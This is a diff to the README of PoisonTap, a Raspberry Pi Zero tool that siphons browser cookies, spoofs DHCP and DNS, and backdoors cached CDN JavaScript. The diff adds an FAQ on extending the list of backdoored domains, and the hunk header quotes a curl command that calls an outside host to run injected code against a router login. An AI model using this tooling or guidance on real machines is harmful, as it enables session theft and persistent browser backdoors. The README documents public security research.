@@ -199,8 +199,15 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 * **pi_poisontap.js** - This runs via Node.js on the Raspberry Pi Zero and is the HTTP server responsible for handling any HTTP requests intercepted by PoisonTap, storing siphoned cookies, and injecting the cached backdoors.
 * **pi_startup.sh** - This runs upon startup on the Raspberry Pi Zero in order to set the device up to emulate an Ethernet-over-USB gadget, set up our evil DHCP server, allow traffic rerouting, DNS spoofing, and to launch pi_poisontap.js above. 
 * **target_backdoor.js** - This file is prepended to any CDN-related Javascript files, thus backdooring them, e.g. Google CDN's jQuery URL.
-* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara on CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
+* **target\_injected\_xhtmljs.html** - This is the code that gets injected into unintentional/background HTTP/AJAX requests on the victim's machine and spawns the entire attack. It is constructed in a way that it can be interpreted as HTML or as Javascript and still execute the same code. Additionally, the amazing HTML5 canvas is by the incredible <a href="http://codepen.io/ara_node/" target=_blank>Ara oen CodePen</a> and was too amazing not to include. This is the graphical craziness that appears when the page gets taken over by PoisonTap.
 * **poisontap.cookies.log** - This file is generated once the user's machine starts sending HTTP requests to PoisonTap and logs the cookie from the browser along with the associated URL/domain it belongs to.
+
+-----
+
+# Frequently Asked Questions
+
+* **Q:** How do you add additional domains to be backdoored?
+* **A:** The list of domains to be backdoored is set in `target_injected_xhtmljs.html` by the `getDoms()` function. This itself is populated by the `alexa1m.sh` script in the root of the repo. If you wish to add additional domains to this list, you can simply amend the return call in `getDoms()`.
 
 -----
 
